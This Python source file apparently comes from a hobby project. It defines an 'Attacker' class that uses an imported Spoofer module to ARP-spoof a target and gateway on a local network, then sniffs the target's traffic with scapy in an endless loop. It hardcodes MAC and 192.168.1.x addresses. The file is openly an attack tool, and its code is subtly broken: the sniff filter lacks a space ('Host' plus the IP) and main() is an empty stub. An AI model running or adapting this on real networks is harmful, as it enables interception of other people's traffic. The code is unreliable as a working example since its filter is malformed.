from Spoofer import Spoofer
import scapy.all as scapy
import time


class Attacker:
    # for testing in EranKO
    # destinationMac = '14-10-9F-E1-65-61'
    # sourceMAC = '0C-9D-92-82-9F-26'
    # targetIP = '192.168.1.34'
    # gatewayIP = '192.168.1.1' == spoof ip

    def __init__(self, destination_mac='14-10-9F-E1-65-61', source_mac='0C-9D-92-82-9F-26', gateway_ip='192.168.1.1', target_ip='192.168.1.34'):
        self.destinationMac = destination_mac
        self.sourceMAC = source_mac
        self.gatewayIP = gateway_ip
        self.targetIP = target_ip
        self.s = Spoofer(self.destinationMac, self.sourceMAC, self.gatewayIP, self.targetIP)

    def spoof(self):
        """This Func with the usage of the spoofer class will spoof and restore"""
        self.s.main()  # this will use spoof and stop_spoof in spoofer

        print("spoofing stopped by attacker")
        self.s.restore(self.targetIP, self.gatewayIP)
        self.s.restore(self.gatewayIP, self.targetIP)

    def harvest_packets(self):
        """This Func will present the relevant network traffic"""
        filter_param = "Host" + str(self.targetIP)  # his will be the filter for the scapy that runs from attacker pc
        while 'sniffing':
            pkt = scapy.sniff(filter=filter_param, count=1)  # filter will use self.target_ip
            print(pkt[0])
            time.sleep(0.5)

    def main(self):
        """Main function of the Attacker"""
        pass


a = Attacker(target_ip="192.168.1.50")
# a.s.restore("192.168.1.1", "192.168.1.6")
# a.spoof()
a.harvest_packets()
